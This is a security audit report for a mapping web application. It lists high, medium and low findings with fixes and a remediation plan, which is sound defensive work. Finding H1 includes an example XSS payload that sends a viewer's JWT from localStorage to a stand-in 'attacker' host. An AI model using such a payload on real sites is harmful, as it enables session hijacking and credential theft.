# Security Audit Report

**Project:** Annotated Maps
**Audit date:** 2026-04-17
**Previous audit:** 2026-03-31
**Scope:** Full codebase — backend (C++/Drogon), frontend (React/TypeScript), database (MySQL), infrastructure (Docker). Post-refactor clean-sheet audit.

---

## Summary

| Severity | New | Carried from previous audit | Total open |
|---|---:|---:|---:|
| High | 5 | 0 | 5 |
| Medium | 8 | 5 | 13 |
| Low | 5 | 0 | 5 |

No critical findings. The application has solid security fundamentals; open findings are either production-deployment concerns (Argon2id parameters, secret storage, HSTS) or specific hardening opportunities (XSS in Leaflet popups, resource-limit races).

Deliberate design trade-offs are listed separately below.

---

## Current security posture

The application implements the following security controls (verified in this audit):

### Backend
- **Parameterized queries:** All SQL uses Drogon's `execSqlAsync` bind arguments. No string concatenation, no dynamic column names.
- **Argon2id password hashing:** libsodium's `crypto_pwhash_str`. Legacy SHA-256 hashes rejected at login.
- **Per-request user verification:** `JwtFilter` checks `users.status` against the database on every authenticated request. Status changes take effect immediately.
- **JWT scoping:** HS256, `issuer` + `audience` (`annotated-maps`) + `orgId` claims all validated.
- **Shared error helpers:** `ErrorResponse.h` provides `errorJson()`/`errorResponse()` — removes duplication and ensures consistent `{error, message}` shape.
- **Tenant isolation:** `TenantFilter` runs before every tenant-scoped endpoint and verifies `tenant_members` membership before any controller code runs. Superuser bypass is explicit.
- **Rate limiting:** `RateLimitFilter` applies a sliding-window limit to login, registration, and SSO endpoints. Returns 429 with `Retry-After`. Configurable via `custom_config.rate_limit`.
- **Input validation:** GeoJSON structure, media URL schemes (`http`/`https`), branding colors (hex), branding URLs (HTTPS-only), display-name length, and pagination bounds all validated.
- **Resource limits:** 1,000 maps/tenant, 5,000 annotations/map, 10,000 notes/map.
- **Audit logging:** `audit_log` records security events (login success/failure, registration, SSO login, member add/remove, permission changes) with atomic success/failure counters.
- **Security headers:** `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`.
- **CORS allowlist:** Origins listed in `allowed_origins` config; unknown origins receive no CORS headers.
- **Secrets management:** `JWT_SECRET` env var overrides config. Minimum 32 characters enforced when env var is set. Config placeholders (`CHANGE_ME...`) trigger startup warnings.
- **Registration privacy at the login endpoint:** Login returns identical error for wrong password and nonexistent email.
- **SSO enumeration resistance:** SSO initiate returns generic "SSO is not available" for all error cases.

### Frontend
- **No `dangerouslySetInnerHTML`, no `eval`, no `innerHTML` assignments** in component code (React's default escaping handles all component output safely).
- **Shared error extraction:** `utils/errors.ts` provides `extractApiError()` — removes scattered AxiosError handling and ensures errors reach the UI consistently.
- **401 interceptor:** Axios interceptor clears auth state and redirects to login, skipping `/auth/*` endpoints so wrong-password errors don't cause mid-form redirects.
- **PKCE-like state protection on backend:** SSO state parameter validated before issuing JWT in callback.

### Database
- **Foreign key integrity:** CASCADE/SET NULL/RESTRICT chosen appropriately per table. Audit log records survive entity deletion via SET NULL.
- **Unique constraints:** Usernames, emails, org-scoped external IDs, tenant memberships, and map permissions enforced at the DB level.
- **Public-permission uniqueness:** Enforced by BEFORE INSERT/UPDATE triggers since MySQL's UNIQUE treats each NULL as distinct.
- **Schema consolidated** (#44): Single clean `001_schema.sql` eliminates `ALTER TABLE` history and makes the final shape easy to review.

---

## Open findings

### High

#### H1 (NEW): XSS via Leaflet popup HTML templates

**Files:** `frontend/src/components/Map/AnnotationLayer.tsx:23-52`, `frontend/src/components/Map/NoteMarkers.tsx:48-55`

`createPopupContent()` and the note-marker popup builder construct HTML via JS template literals that interpolate user-controlled fields (`annotation.title`, `annotation.description`, `media.url`, `media.caption`, `note.title`, `note.text`, `createdByUsername`) directly. The resulting string is passed to `layer.bindPopup(...)`, which Leaflet renders as HTML. An editor-permission user who writes `<img src=x onerror="fetch('https://attacker/?t='+localStorage.getItem('auth-storage'))">` into a note title exfiltrates every viewer's JWT.

**Mitigation in place:** React escapes output in components, so this is limited to Leaflet popup code paths.

**Fix:** Either sanitize via DOMPurify, or build the popup DOM with `document.createElement` + `textContent` (which Leaflet's `bindPopup` also accepts as a DOM node).

**Effort:** Small (~30 lines).

---

#### H2 (NEW): `RAND_bytes()` return value not checked in SSO state generation

**File:** `backend/src/controllers/SsoController.cpp:13-20`

```cpp
std::string SsoController::generateRandom(int bytes) {
    std::vector<unsigned char> buf(bytes);
    RAND_bytes(buf.data(), bytes);  // return ignored
    ...
}
```

OpenSSL's `RAND_bytes` returns 1 on success, 0 if the RNG hasn't been seeded, or -1 if unsupported. On failure the buffer may be zero-initialized or partially populated, yielding predictable state/nonce values and defeating the SSO CSRF and replay protections.

**Fix:** Throw on non-1 return. One-line change.

**Effort:** Trivial.

---

#### H3 (NEW): JWT secret placeholder warning should be fatal

**File:** `backend/src/main.cpp:21-37`

Deploying with `CHANGE_ME_USE_A_LONG_RANDOM_STRING` in `config.json` and no `JWT_SECRET` env var prints a `WARNING:` to stderr and keeps running. A missed startup log during production deployment would allow token forgery with a well-known secret.

**Fix:** Exit with non-zero on placeholder detection unless `ALLOW_PLACEHOLDER_SECRETS=1` is explicitly set (for intentional dev builds).

**Effort:** Trivial.

---

#### H4 (NEW): Argon2id parameters set to `*_MIN` values

**File:** `backend/src/controllers/AuthController.cpp:17-27`

Current settings (`OPSLIMIT_MIN`, `MEMLIMIT_MIN`) were chosen to work around x86_64-on-ARM emulation slowness during development. The in-code comment notes this is not appropriate for production. `OPSLIMIT_MIN = 1` and `MEMLIMIT_MIN = 8 MB` are meaningfully weaker than `OPSLIMIT_INTERACTIVE = 4` and `MEMLIMIT_INTERACTIVE = 64 MB`.

**Fix:** Make the parameters configurable via env var (`ARGON2_OPSLIMIT`, `ARGON2_MEMLIMIT`) and document recommended production values.

**Effort:** Small (~20 lines).

---

#### H5 (NEW): SSO provider `client_secret` stored in plaintext in the database

**File:** `database/migrations/001_schema.sql:92-99`, `backend/src/controllers/SsoController.cpp:170`

The `sso_providers.config` JSON column contains `client_secret` as plaintext. Any actor with database read access (DBAs, backup systems, replicas, compromised application) can retrieve every tenant's IdP credential.

**Fix:** Two options — (a) application-layer encryption of the secret field before insert and on read, with key in a secret manager/env var, or (b) move `client_secret` out of the database entirely and into a secret manager keyed by `org_id`. Option (b) is cleaner operationally.

**Effort:** Moderate (~100 lines + deployment runbook change).

---

### Medium

#### M1 (CARRIED): OIDC nonce not verified against ID token

**File:** `backend/src/controllers/SsoController.cpp`

Nonce is generated and stored at initiate but never compared against the ID token's `nonce` claim in the callback. Leaves the OIDC flow open to token replay.

**Fix:** Decode the ID token (separate from access token) and compare `nonce`. ~20 lines.

---

#### M2 (CARRIED): JWT stored in localStorage

**File:** `frontend/src/store/authStore.ts`

Persisted via Zustand's `persist` middleware. Any XSS (e.g., H1 above) reads the token.

**Mitigations:** Security headers, input validation, H1 fix will close the currently-known XSS vector.

**Fix:** HttpOnly cookies require CSRF token infrastructure and backend changes (~100+ lines). Lower-effort intermediate: move to sessionStorage so the token is cleared on tab close.

---

#### M3 (CARRIED): SSO token passed in URL fragment

**Files:** `backend/src/controllers/SsoController.cpp`, `frontend/src/pages/SsoCallbackPage.tsx`

URL fragments can leak via browser history, `Referer` headers on outbound link clicks, and some browser extensions.

**Fix:** One-time authorization code: backend stores JWT server-side keyed by a short-lived code, redirects with the code in a query parameter, frontend POSTs to exchange it for the JWT. ~50 backend lines.

---

#### M4 (CARRIED): SSO user upsert race / identity collision

**File:** `backend/src/controllers/SsoController.cpp:297-306`

`ON DUPLICATE KEY UPDATE username=VALUES(username), email=VALUES(email)` silently overwrites email and username on matching `(org_id, external_id)`. If an IdP reuses subject IDs (against spec but observed in practice), this reassigns an existing account to a new person.

**Fix:** Detect email change and require admin approval, or log and reject.

---

#### M5 (CARRIED): Rate limiter is in-process only

**File:** `backend/src/filters/RateLimitFilter.cpp`

Multi-instance deployments each keep independent counters; attacker multiplies effective rate by instance count.

**Fix:** Redis-backed `INCR`/`EXPIRE` or enforce at reverse proxy. Fine as-is for single-instance deployments.

---

#### M6 (NEW): No Content-Security-Policy header

**Files:** `backend/src/main.cpp:68-87`, `frontend/index.html`

No CSP is set by the backend or via meta tag. A CSP is the main defense-in-depth when XSS protections fail.

**Fix:** Add `Content-Security-Policy: default-src 'self'; img-src 'self' https: data:; connect-src 'self' https://tile.openstreetmap.org; frame-ancestors 'none'` (plus `style-src 'self' 'unsafe-inline'` for Leaflet). Set from the backend's pre-send advice.

**Effort:** Small. Test carefully — CSP breakage is subtle.

---

#### M7 (NEW): No HSTS header

**File:** `backend/src/main.cpp:68-87`

Without `Strict-Transport-Security`, a user connecting over HTTP once (before the app forces HTTPS) is vulnerable to a MITM downgrade.

**Fix:** Add `Strict-Transport-Security: max-age=31536000; includeSubDomains` in production only (detect via `X-Forwarded-Proto` or a production flag).

**Effort:** Trivial.

---

#### M8 (NEW): No length limits on title/description/text fields

**Files:** `backend/src/controllers/MapController.cpp` (`title`, `description`), `AnnotationController.cpp` (`title`, `description`), `NoteController.cpp` (`text`, `title`), `NoteGroupController.cpp` (`name`, `description`)

Fields are inserted into `VARCHAR(255)` or `TEXT` columns without server-side length checks; the database truncates silently on VARCHAR and accepts up to 64KB on TEXT. An unauthenticated-after-register user could flood the DB with max-size TEXT payloads.

**Fix:** Validate lengths at controller entry (e.g., 255 for titles, 10KB for descriptions, 64KB for notes) and return 400 if exceeded.

**Effort:** Small.

---

#### M9 (NEW): Race conditions in resource-limit enforcement

**Files:** `MapController.cpp:119-131`, `AnnotationController.cpp:145-158`, `NoteController.cpp:135-147`

Pattern: `SELECT COUNT(*)` → compare to limit → `INSERT`. Two concurrent requests can both pass the check and both insert, exceeding the limit.

**Fix:** Either combine into atomic `INSERT ... SELECT ... WHERE (SELECT COUNT(*) ...) < limit` or enforce at the database level via a trigger.

**Effort:** Small-moderate (three controllers, plus a test).

---

#### M10 (NEW): No rate limit on content-creation endpoints

**Files:** `backend/src/main.cpp` filter registration

`RateLimitFilter` applies only to auth endpoints. An authenticated attacker can spam map/annotation/note creation up to the resource cap and fill `audit_log`.

**Fix:** Apply a per-user or per-tenant rate limit to POST/PUT/DELETE content endpoints. Requires a user-scoped key instead of IP-scoped in `RateLimitFilter`.

**Effort:** Moderate.

---

#### M11 (NEW): X-Forwarded-For trust is implicit

**File:** `backend/src/filters/RateLimitFilter.cpp:14-21`

`RateLimitFilter` uses `X-Forwarded-For` without verifying that the request came from a trusted reverse proxy. Direct requests to the Drogon process (or requests through a proxy that forwards client headers) can spoof IPs.

**Fix:** Document that the app must only accept traffic via a trusted proxy that strips client `X-Forwarded-For`, OR only trust the rightmost entry when a fixed number of trusted proxies is configured.

**Effort:** Small (config + doc).

---

#### M12 (NEW): Missing audit logs for delete/update operations

**Files:** `MapController.cpp`, `AnnotationController.cpp`, `NoteController.cpp`, `NoteGroupController.cpp`, `TenantController.cpp` (branding update)

Audit log currently captures: register, login success/failure, SSO login, member add/remove, permission change. It does not capture: map/annotation/note/group deletions, map/annotation/note updates, branding changes. These are the destructive/mutative operations most important for incident investigation.

**Fix:** Add `AuditLog::record(...)` calls to each delete and update path, with enough detail to identify the affected resource.

**Effort:** Small-moderate.

---

#### M13 (NEW): Frontend media URL rendering accepts any scheme

**File:** `frontend/src/components/Map/AnnotationLayer.tsx:28-30`

The backend validates `http`/`https` for media URLs on submission. The frontend re-renders stored URLs without its own scheme check. If backend validation is ever bypassed (direct DB insert, future API gap), the frontend would render `javascript:` or `data:text/html` URLs. Defense-in-depth gap.

**Fix:** Validate scheme in `createPopupContent()` (same fix file as H1).

**Effort:** Trivial.

---

### Low

#### L1 (NEW): GeoJSON coordinate ranges not validated

Controllers accept any numeric coordinates. Stored as `DECIMAL(10,7)` which cannot overflow but nonsense data (e.g., `lng=500`) reaches the map. Cosmetic, not exploitable.

#### L2 (NEW): Note `lat`/`lng` ranges not validated

Same as L1 for notes. `DECIMAL(10,7)` field prevents worse outcomes.

#### L3 (NEW): Missing composite index on `audit_log(event_type, created_at)`

Separate indexes exist on each column. Time-range queries filtered by event type will use one index and filter with the other in memory. Performance concern, not security, but matters for incident-investigation workflows.

#### L4 (NEW): No `Permissions-Policy` header

Standard hardening header; disables unused browser features (camera, mic, geolocation, etc.).

**Fix:** `Permissions-Policy: geolocation=(), microphone=(), camera=(), usb=()`. One-liner in `main.cpp`.

#### L5 (NEW): `leaflet-draw` is effectively unmaintained

`leaflet-draw` (last meaningful release 2018) has no open CVEs at the time of this audit, but the upstream is dormant. Future vulns will not be patched. Low operational risk until a CVE appears.

**Fix:** Track; consider replacement if an issue surfaces.

---

## Deliberate design trade-offs

These are known decisions, not findings. Documented for future auditors.

- **`email_taken` / `username_taken` distinct error codes** (`backend/src/controllers/AuthController.cpp:165-176`): The frontend shows specific error messages on registration ("this email is already registered" vs. "this username is already taken") for UX. This trades a small amount of user-enumeration resistance for clearer feedback. Acceptable because the registration endpoint is rate-limited and email enumeration is generally possible via the password-reset flow of any auth system that supports it. Not introducing password reset yet; re-evaluate if/when it ships.

- **Single-process rate limiter** (M5): Acceptable for the current single-instance deployment target. Revisit when scaling horizontally.

- **No row-level tenant isolation in the database**: Tenant isolation is enforced exclusively by `TenantFilter` at the controller layer. This is a pragmatic choice — row-level security adds operational complexity without meaningful additional protection if the application layer is correctly audited (which it is, via `test_09_security.py`).

- **Dev defaults in `docker-compose.yml`** (`rootpassword`, `annmaps_pass`): Hardcoded for local development. Production deployment is expected to override via `.env` file.

- **`ON DELETE CASCADE` on map owner**: Deleting a user cascades their maps (and therefore all annotations/notes/permissions). This matches the v0.1 model of "maps are owned by one user." If the product later supports org-owned maps, this should change.

---

## Remediation plan

### Must fix before v0.1 release

- H1 — XSS in Leaflet popups (exploitable by any user with edit permission on a map)
- H2 — `RAND_bytes` return value check (trivial; prevents deterministic state generation under RNG failure)
- H3 — Make JWT placeholder fatal at startup (prevents a specific deployment mistake)

### Should fix before v0.1 production deployment

- H4 — Argon2id parameters configurable + production values documented
- H5 — Encrypt or externalize SSO `client_secret`
- M6, M7 — CSP and HSTS headers
- M8 — Input length limits

### Fix opportunistically (milestones permitting)

- M1, M3, M4 — SSO hardening
- M9, M10, M12 — Resource limits, content-endpoint rate limits, audit log coverage
- M13 — Frontend scheme validation (shares fix file with H1)

### Track but don't block release

- M2 — JWT storage (large refactor; current mitigations acceptable given H1 fix)
- M5 — Rate limiter scope (single-instance for now)
- M11 — X-Forwarded-For trust (documentation; enforce at deployment)
- All Low findings

---

## Audit methodology

Three parallel explore agents independently audited backend, frontend, and database layers. Their raw findings were cross-checked against source code by reading the cited file:line references. Findings that turned out to be non-issues (e.g., agents flagged `listTenants` as missing `TenantFilter` — correct behavior, no tenantId in path; flagged `username_taken` distinction as user-enumeration — intentional trade-off documented above) were removed. Severities were calibrated downward where agents were generous, and upward for a few items where agents underestimated exploitability.
